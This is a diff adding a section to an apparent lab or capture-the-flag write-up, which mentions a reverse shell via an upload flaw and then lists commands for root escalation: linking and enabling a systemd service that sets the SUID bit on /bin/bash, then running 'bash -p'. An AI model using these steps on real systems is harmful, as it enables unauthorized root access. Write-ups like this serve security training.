@@ -163,3 +163,33 @@ WantedBy=multi-user.target' > $TF
 I started with reconnaissance to identify the open services.
 I found an upload vulnerability in the web app, exploited it to upload a reverse shell, and gained access as www-data.
 From there, I performed privilege escalation using SUID binaries to become root.
+
+## Information related to execute root shell
+# Sequence of Commands
+*Link the service*
+`/bin/systemctl link $TF`
+*This creates a symlink from the temporary service file to the systemd directory.*
+
+# Enable and Start the Service: Next, you need to enable and start the service. Make sure you run this command on its own:
+`/bin/systemctl enable --now $TF`
+*This will execute the systemd service you created, which should set the SUID bit on `/bin/bash` as defined in service file*
+
+# Execute the Root Shell:
+*After enabling the service, you can then run the SUID bash to get a root shell.*
+*The command `/bin/bash -p` runs the `bash` shell with SUID privileges (if the SUID bit was set):*
+*(if the SUID bit was set):*
+`/bin/bash -p`
+*This should give you a root shell (bash-4.3#), where you can perform privileged actions.*
+
+# Full Correct Command Sequence:
+1. Link the service:
+
+/bin/systemctl link $TF
+
+2. Enable and start the service:
+
+/bin/systemctl enable --now $TF
+
+3. Run `bash` with SUID privileges:
+
+`/bin/bash -p`
